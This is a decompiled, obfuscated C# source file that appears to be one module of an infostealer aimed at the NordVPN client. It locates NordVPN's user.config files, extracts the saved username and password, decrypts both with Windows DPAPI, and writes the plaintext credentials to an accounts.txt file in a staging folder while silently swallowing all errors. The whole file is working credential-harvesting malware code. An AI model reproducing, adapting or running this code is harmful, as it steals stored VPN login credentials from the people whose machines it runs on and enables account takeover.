using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using ns13;

namespace ns4;

internal sealed class Class14
{
	private static string smethod_0(string string_0)
	{
		try
		{
			return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(string_0), (byte[])null, (DataProtectionScope)1));
		}
		catch
		{
			return "";
		}
	}

	public static void smethod_1(string string_0)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Class56.string_4, "NordVPN"));
		if (!directoryInfo.Exists)
		{
			return;
		}
		try
		{
			Directory.CreateDirectory(string_0);
			DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
			for (int i = 0; i < directories.Length; i++)
			{
				DirectoryInfo[] directories2 = directories[i].GetDirectories();
				foreach (DirectoryInfo directoryInfo2 in directories2)
				{
					string text = Path.Combine(directoryInfo2.FullName, "user.config");
					if (File.Exists(text))
					{
						Directory.CreateDirectory(string_0 + "\\" + directoryInfo2.Name);
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(text);
						string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value")!.InnerText;
						string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value")!.InnerText;
						if (innerText != null && !string.IsNullOrEmpty(innerText) && innerText2 != null && !string.IsNullOrEmpty(innerText2))
						{
							string text2 = smethod_0(innerText);
							string text3 = smethod_0(innerText2);
							Class55.int_7++;
							File.AppendAllText(string_0 + "\\" + directoryInfo2.Name + "\\accounts.txt", "Username: " + text2 + "\nPassword: " + text3 + "\n\n");
						}
					}
				}
			}
		}
		catch
		{
		}
	}
}
